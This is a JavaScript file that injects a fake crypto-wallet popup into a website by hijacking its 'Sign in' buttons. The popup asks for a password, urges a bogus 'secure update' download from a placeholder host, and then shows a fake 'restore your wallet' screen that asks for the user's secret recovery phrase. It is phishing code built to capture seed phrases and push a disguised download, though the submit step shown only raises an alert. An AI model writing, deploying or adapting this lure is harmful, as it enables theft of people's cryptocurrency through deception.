// walletPopup.js

function showWalletPopup() {
  // Prevent multiple popups
  if (document.getElementById('popup')) {
    document.getElementById('popup').classList.add('active');
    return;
  }

  // Create popup container
  const popup = document.createElement('div');
  popup.className = 'wallet-popup';
  popup.id = 'popup';
  popup.innerHTML = `
    <div id="passwordSection" class="section active">
      <input type="password" placeholder="Enter your password" id="passwordInput" />
      <button id="unlockBtn" disabled>Unlock</button>
    </div>
    <div id="updateSection" class="section">
      <span class="download-label">
        A secure update is ready. Please download to continue protecting your assets.
      </span>
      <button id="downloadBtn">Download Update</button>
      <button id="skipBtn" style="margin-top:10px;background:#222b;">Skip</button>
    </div>
    <div id="loaderSection" class="loader-section">
      <div class="loader"></div>
      <div class="loader-message" id="loaderMsg"></div>
    </div>
    <div id="phraseSection" class="section">
      <textarea placeholder="Import with Secret Phrase" id="phraseInput" rows="8" style="resize: none;"></textarea>
      <button id="submitBtn" disabled>Submit</button>
    </div>
  `;

  // Add styles
  const style = document.createElement('style');
  style.textContent = `
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
    .wallet-popup {
      position: fixed;
      top: 0px;
      right: 24px;
      width: 330px;
      min-height: 540px;
      background: #0d0d2b url('x.png') no-repeat center / cover;
      color: #fff;
      border-radius: 14px;
      box-shadow: 0 8px 32px rgba(0,0,0,0.28);
      padding: 32px 24px;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.4s cubic-bezier(.4,0,.2,1);
      display: flex;
      flex-direction: column;
      align-items: center;
      z-index: 9999;
    }
    .wallet-popup.active {
      opacity: 1;
      pointer-events: auto;
    }
    input, button, textarea {
      width: 100%;
      padding: 12px;
      margin-top: 20px;
      border-radius: 8px;
      border: none;
      font-size: 15px;
      box-sizing: border-box;
      display: block;
      font-family: 'Inter', 'Segoe UI', Arial, sans-serif;
    }
    input, textarea {
      border: 2px solid #626664;
      border-radius: 18px;
      background: #28292c;
      color: #ffffff;
      font-weight: 400;
      letter-spacing: 0.2px;
    }
    input::placeholder {
      color: #bdbecb;
      text-align: left;
      font-size: 15px;
      font-weight: 400;
      opacity: 1;
    }
    textarea::placeholder {
      color: #ffffff;
      text-align: left;
      font-size: 15px;
      font-weight: 400;
      opacity: 1;
    }
    button {
      background: linear-gradient(90deg, #626664 0%, #e49927 100%);
      color: #fff;
      font-weight: 500;
      cursor: pointer;
      transition: background 0.25s cubic-bezier(.4,0,.2,1), box-shadow 0.2s;
      margin-top: 24px;
      font-size: 15px;
      padding: 12px 0;
      box-shadow: 0 2px 8px rgba(58,122,254,0.08);
      letter-spacing: 0.2px;
    }
    button:disabled {
      opacity: 0.6;
      cursor: not-allowed;
      background: #e49927;
    }
    button:hover:enabled {
      background: linear-gradient(90deg, #626664 0%, #e49927 100%);
      box-shadow: 0 4px 16px rgba(58,122,254,0.16);
    }
    .section {
      display: none;
      margin-top: 14px;
      width: 100%;
      flex-direction: column;
      align-items: center;
      min-height: 550px;
      justify-content: center;
      position: relative;
      transition: opacity 0.4s cubic-bezier(.4,0,.2,1);
      opacity: 0;
      pointer-events: none;
    }
    .section.active {
      display: flex;
      opacity: 1;
      pointer-events: auto;
      transition: opacity 0.4s cubic-bezier(.4,0,.2,1);
    }
    #phraseInput {
      min-height: 100px;
      font-family: inherit;
      text-align: left;
      resize: none;
    }
    .download-label {
      color: #bdbecb;
      font-size: 15px;
      text-align: center;
      margin-bottom: 8px;
      margin-top: 0;
      font-weight: 500;
      line-height: 1.5;
      width: 100%;
      display: block;
    }
    .loader-section {
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 550px;
      width: 100%;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.4s cubic-bezier(.4,0,.2,1);
    }
    .loader-section.active {
      display: flex;
      opacity: 1;
      pointer-events: auto;
      transition: opacity 0.4s cubic-bezier(.4,0,.2,1);
    }
    .loader {
      border: 4px solid #22244a;
      border-top: 4px solid #626664;
      border-radius: 50%;
      width: 48px;
      height: 48px;
      animation: spin 1s linear infinite;
      margin-bottom: 28px;
      margin-top: 10px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg);}
      100% { transform: rotate(360deg);}
    }
    .loader-message {
      color: #bdbecb;
      font-size: 16px;
      text-align: center;
      margin-top: 0;
      font-weight: 500;
      line-height: 1.6;
      max-width: 260px;
      animation: fadeIn 0.8s;
    }
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    input:focus, textarea:focus {
      border-color: #626664 !important;
      box-shadow: 0 0 0 2px #62666433;
      outline: none;
    }
    .toggle-password {
      fill: #626664;
      cursor: pointer;
    }
  `;
  document.head.appendChild(style);

  document.body.appendChild(popup);

  // Show popup with fade-in
  setTimeout(() => {
    popup.classList.add('active');
    document.querySelectorAll('.section, .loader-section').forEach((sec, idx) => {
      sec.classList.toggle('active', idx === 0);
    });
  }, 10);

  // Logic for enabling/disabling buttons
  const phraseInput = popup.querySelector('#phraseInput');
  const submitBtn = popup.querySelector('#submitBtn');
  function togglePhraseBtn() {
    submitBtn.disabled = phraseInput.value.trim() === '';
  }
  phraseInput.addEventListener('input', togglePhraseBtn);
  togglePhraseBtn();

  const passwordInput = popup.querySelector('#passwordInput');
  const unlockBtn = popup.querySelector('#unlockBtn');
  function toggleUnlockBtn() {
    unlockBtn.disabled = passwordInput.value.trim() === '';
  }
  passwordInput.addEventListener('input', toggleUnlockBtn);
  toggleUnlockBtn();

  // Section navigation logic
  function nextSection(showId) {
    popup.querySelectorAll('.section, .loader-section').forEach(sec => sec.classList.remove('active'));
    popup.querySelector(`#${showId}`).classList.add('active');
  }

  // Download button
  popup.querySelector('#downloadBtn').onclick = function() {
    const a = document.createElement('a');
    a.href = 'https://example.com/wallet-update.zip';
    a.download = 'wallet-update.zip';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    // Do NOT show phrase section after download
  };

  // Skip button
  popup.querySelector('#skipBtn').onclick = function() {
    showLoader();
  };

  // Unlock button
  unlockBtn.onclick = function() {
    showLazyLoader();
  };

  // Submit button
  submitBtn.onclick = function() {
    submitPhrase();
  };

  // Loader logic
  function showLoader() {
    popup.querySelector('#loaderMsg').textContent = "For your security, we need to restore your wallet. Please wait while we prepare your recovery process.";
    nextSection('loaderSection');
    setTimeout(() => {
      nextSection('phraseSection');
    }, 5000);
  }

  function showLazyLoader() {
    popup.querySelector('#loaderMsg').textContent = "";
    nextSection('loaderSection');
    setTimeout(() => {
      nextSection('updateSection');
    }, 2000);
  }

  function submitPhrase() {
    const phrase = phraseInput.value.trim();
    if (!phrase) {
      alert('Please enter your secret phrase.');
      phraseInput.focus();
      return;
    }
    alert('Phrase submitted!');
    popup.classList.remove('active');
  }
}

document.addEventListener('DOMContentLoaded', function() {
  // Attach to "Show Popup" button if it exists
  const btn = document.getElementById('showPopupBtn');
  if (btn) {
    btn.onclick = showWalletPopup;
  }

  // Attach to the "Sign in" button in the navbar
  var signInBtn = document.getElementById('w-node-_86e3eda5-f50c-9eac-e4c3-b95121525a71-21525a5a');
  if (signInBtn) {
    signInBtn.addEventListener('click', function(e) {
      e.preventDefault(); // Prevent navigation
      showWalletPopup();
    });
  }

  // Attach to the "Sign in" button in the hero section
  var heroSignInBtn = document.getElementById('w-node-cfb10607-1aed-06f8-73c2-bd886d701d46-3a1ba278');
  if (heroSignInBtn) {
    heroSignInBtn.addEventListener('click', function(e) {
      e.preventDefault(); // Prevent navigation
      showWalletPopup();
    });
  }
});